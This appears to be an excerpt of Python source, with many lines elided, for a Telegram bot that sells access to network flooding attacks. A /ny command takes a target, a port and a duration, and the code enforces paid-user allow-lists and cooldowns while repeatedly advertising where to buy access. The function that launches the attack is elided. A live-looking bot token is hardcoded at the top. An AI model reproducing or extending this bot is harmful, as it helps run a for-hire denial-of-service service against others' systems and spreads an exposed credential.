...
bot = telebot.TeleBot('8192946185:AAHbYD3TeMCIaxDFcO3KpvDyfrz5sH5K7ss')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "You have not purchased yet purchase now from:- @NandYadu1c✅."
...
def clear_users_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @NandYadu1c✅ 🙇."
    bot.reply_to(message, response)
...
# Function to handle the reply when free users run the /ny command
...
# Dictionary to store the last time each user ran the /ny command
ny_cooldown = {}
...
def start_attack(user_id, target, port, time):
    ...
    try:
        ...
        response = f"Brother EnJoy ❤️ Target: {target} Port: {port} Time: {time}"
...
def run_attack_and_notify(message, user_id, target, port, time):
    ...
    if success:
        ...
        bot.reply_to(message, "ʏᴏᴜʀ ᴘʀᴇᴠɪᴏᴜꜱ ᴀᴛᴛᴀᴄᴋ ɪꜱ ꜰɪɴɪꜱʜᴇᴅ ❤️‍🔥🙃")

# Handler for /ny command
@bot.message_handler(commands=['ny'])
def handle_ny(message):
    user_id = str(message.chat.id)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in ny_cooldown and (datetime.datetime.now() - ny_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /ny Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            ny_cooldown[user_id] = datetime.datetime.now()
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                ...
                attack_start_message = (
                    ...
                    f"𝐏𝐨𝐫𝐭: {port}\n"
                    f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
                    f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of :- @NandYadu1c✅."
                )
            ...
            response = "✅ Usage :- /ny <target> <port> <time>"  # Updated command syntax
    else:
        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /ny command. DM TO BUY ACCESS:- @NandYadu1c✅"
